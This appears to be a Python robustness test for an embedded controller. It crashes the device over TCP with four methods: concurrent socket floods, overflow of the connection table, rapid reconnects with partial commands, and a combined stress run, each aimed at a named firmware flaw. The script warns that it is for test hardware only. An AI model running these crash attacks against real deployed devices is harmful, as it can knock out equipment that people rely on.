#!/usr/bin/env python3
"""
test_crash.py


Usage:
    python test_crash.py --ip 192.168.1.100
    python test_crash.py --ip 192.168.1.100 --duration 300
"""

import argparse
import socket
import time
import signal
import random
import threading
from datetime import datetime

from ilc_test_common import (
    SCB_ADDRESS, SCB_PORT, CMD_GET_SCB_DATA, SOCKET_TIMEOUT,
    build_command, create_socket, check_device_alive, wait_for_device,
    TestResult, save_result, print_result_summary
)

stop_flag = False
MAX_CLIENTS = 5

def signal_handler(sig, frame):
    global stop_flag
    print("\nStopping...")
    stop_flag = True

class CrashTester:
    def __init__(self, scb_ip: str):
        self.scb_ip = scb_ip
        self.crash_detected = False
        self.crash_method = None
        self.result = TestResult(test_name="crash_test", start_time=datetime.now())
    
    def check_for_crash(self, method_name: str) -> bool:
        """Check if device crashed by testing responsiveness."""
        if not check_device_alive(self.scb_ip, timeout=3.0):
            print(f"\n  ⚠️  Device UNRESPONSIVE after {method_name}")
            self.result.device_unresponsive_events += 1
            
            # Wait for device to come back
            print(f"  Waiting for device to recover...")
            if wait_for_device(self.scb_ip, timeout=60):
                print(f"  ✓ Device recovered - CRASH CONFIRMED!")
                self.crash_detected = True
                self.crash_method = method_name
                self.result.possible_crashes += 1
                return True
            else:
                print(f"  ✗ Device not recovering - may be stuck in bootloader")
                self.crash_detected = True
                self.crash_method = method_name + " (no recovery)"
                self.result.possible_crashes += 1
                return True
        return False
    
    def attack_concurrent_flood(self, duration: float = 10.0, num_sockets: int = 5):
        """Flood multiple sockets to trigger parser spin-wait → IWDG timeout."""
        print(f"\n[ATTACK] Concurrent Flood ({num_sockets} sockets, {duration}s)")
        print(f"  Target: parser_running spin-wait → IWDG timeout")
        
        cmd = build_command(SCB_ADDRESS, CMD_GET_SCB_DATA)
        sent_count = [0]  # Use list for thread-safe counter
        
        def flood_worker():
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(SOCKET_TIMEOUT)
                sock.connect((self.scb_ip, SCB_PORT))
                
                end_time = time.time() + duration
                while time.time() < end_time and not stop_flag:
                    try:
                        sock.send(cmd)
                        sent_count[0] += 1
                        self.result.requests_sent += 1
                        sock.setblocking(False)
                        try:
                            resp = sock.recv(4096)
                            if resp:
                                self.result.responses_received += 1
                        except BlockingIOError:
                            pass
                        sock.setblocking(True)
                        sock.settimeout(0.1)
                    except:
                        break
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
        
        threads = [threading.Thread(target=flood_worker) for _ in range(num_sockets)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        print(f"  Sent {sent_count[0]} commands")
        return self.check_for_crash("concurrent_flood")
    
    def attack_connection_overflow(self, iterations: int = 50):
        """Rapidly overflow connection table."""
        print(f"\n[ATTACK] Connection Overflow ({iterations} iterations)")
        print(f"  Target: client_table corruption → Hard Fault")
        
        cmd = build_command(SCB_ADDRESS, CMD_GET_SCB_DATA)
        max_opened = 0
        
        for i in range(iterations):
            if stop_flag or self.crash_detected:
                break
            
            sockets = []
            for j in range(MAX_CLIENTS + 3):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((self.scb_ip, SCB_PORT))
                    sockets.append(sock)
                except:
                    pass
            
            if len(sockets) > max_opened:
                max_opened = len(sockets)
            
            # Send on all and close in random order
            random.shuffle(sockets)
            for sock in sockets:
                try:
                    sock.send(cmd)
                    self.result.requests_sent += 1
                except:
                    pass
            
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            # Check periodically
            if i > 0 and i % 10 == 0:
                if self.check_for_crash("connection_overflow"):
                    return True
        
        print(f"  Max connections opened: {max_opened}")
        return self.check_for_crash("connection_overflow")
    
    def attack_rapid_reconnect(self, iterations: int = 100):
        """Rapid connect with partial data then disconnect."""
        print(f"\n[ATTACK] Rapid Reconnect ({iterations} iterations)")
        print(f"  Target: State corruption from partial cleanup")
        
        cmd = build_command(SCB_ADDRESS, CMD_GET_SCB_DATA)
        success = 0
        
        for i in range(iterations):
            if stop_flag or self.crash_detected:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                sock.connect((self.scb_ip, SCB_PORT))
                sock.send(cmd[:len(cmd)//2])  # Partial send
                self.result.requests_sent += 1
                sock.close()
                success += 1
            except:
                pass
            
            if i > 0 and i % 25 == 0:
                if self.check_for_crash("rapid_reconnect"):
                    return True
        
        print(f"  Completed: {success}/{iterations}")
        return self.check_for_crash("rapid_reconnect")
    
    def attack_combined_stress(self, duration: float = 20.0):
        """Run multiple attack patterns simultaneously."""
        print(f"\n[ATTACK] Combined Stress ({duration}s)")
        print(f"  Target: Multiple vectors simultaneously")
        
        cmd = build_command(SCB_ADDRESS, CMD_GET_SCB_DATA)
        large_cmd = build_command(SCB_ADDRESS, CMD_GET_SCB_DATA, bytes([0xAA] * 1500))
        end_time = time.time() + duration
        
        def worker_flood():
            while time.time() < end_time and not stop_flag and not self.crash_detected:
                sock = create_socket(self.scb_ip, timeout=1.0)
                if sock:
                    try:
                        sock.send(cmd)
                        self.result.requests_sent += 1
                    except:
                        pass
                    finally:
                        try:
                            sock.close()
                        except:
                            pass
        
        def worker_large():
            while time.time() < end_time and not stop_flag and not self.crash_detected:
                sock = create_socket(self.scb_ip, timeout=1.0)
                if sock:
                    try:
                        sock.send(large_cmd)
                        self.result.requests_sent += 1
                    except:
                        pass
                    finally:
                        try:
                            sock.close()
                        except:
                            pass
                time.sleep(0.05)
        
        def worker_overflow():
            while time.time() < end_time and not stop_flag and not self.crash_detected:
                sockets = []
                for _ in range(MAX_CLIENTS + 2):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        sock.connect((self.scb_ip, SCB_PORT))
                        sockets.append(sock)
                    except:
                        pass
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
                time.sleep(0.1)
        
        threads = [
            threading.Thread(target=worker_flood),
            threading.Thread(target=worker_flood),
            threading.Thread(target=worker_large),
            threading.Thread(target=worker_overflow),
        ]
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        print(f"  Combined stress completed")
        return self.check_for_crash("combined_stress")

def run_crash_test(scb_ip: str, duration: int = 300):
    """Run crash test."""
    print(f"{'='*60}")
    print("CRASH TEST")
    print(f"{'='*60}")
    print(f"Target: {scb_ip}:{SCB_PORT}")
    print(f"Duration: {duration}s")
    print(f"\nWARNING: This test attempts to CRASH the device!")
    print(f"{'='*60}")
    
    # Check device is alive
    print("\nChecking device connectivity...")
    if not check_device_alive(scb_ip):
        print("ERROR: Device not responding!")
        return None
    print("Device responsive.\n")
    
    tester = CrashTester(scb_ip)
    start_time = time.time()
    end_time = start_time + duration
    round_num = 0
    
    attack_sequence = [
        lambda: tester.attack_concurrent_flood(duration=10.0, num_sockets=5),
        lambda: tester.attack_connection_overflow(iterations=30),
        lambda: tester.attack_rapid_reconnect(iterations=50),
        lambda: tester.attack_combined_stress(duration=15.0),
    ]
    
    while time.time() < end_time and not stop_flag and not tester.crash_detected:
        round_num += 1
        remaining = (end_time - time.time()) / 60
        
        print(f"\n{'='*60}")
        print(f"ROUND {round_num} ({remaining:.1f} min remaining)")
        print(f"{'='*60}")
        
        for attack_func in attack_sequence:
            if stop_flag or tester.crash_detected or time.time() >= end_time:
                break
            
            if attack_func():
                break
        
        if not tester.crash_detected:
            time.sleep(2)
    
    tester.result.end_time = datetime.now()
    
    # Final results
    print(f"\n{'='*60}")
    print("CRASH TEST RESULTS")
    print(f"{'='*60}")
    
    if tester.crash_detected:
        print(f"\n🔴 CRASH DETECTED!")
        print(f"   Method: {tester.crash_method}")
        print(f"   Rounds: {round_num}")
    else:
        print(f"\n✓ No crash detected")
        print(f"   Rounds: {round_num}")
        print(f"   Device survived all attacks")
    
    print_result_summary(tester.result)
    
    return tester.result

def main():
    parser = argparse.ArgumentParser(description='Crash Test')
    parser.add_argument('--ip', required=True, help='SCB IP address')
    parser.add_argument('--duration', type=int, default=300, help='Test duration in seconds')
    parser.add_argument('--output', type=str, default='crash_result.json', help='Output file')
    
    args = parser.parse_args()
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\n" + "!"*60)
    print("WARNING: This test is designed to CRASH the device!")
    print("Only use on test hardware, not production systems.")
    print("!"*60)
    
    input("\nPress Enter to continue or Ctrl+C to abort...")
    
    result = run_crash_test(args.ip, args.duration)
    if result:
        save_result(result, args.output)

if __name__ == '__main__':
    main()
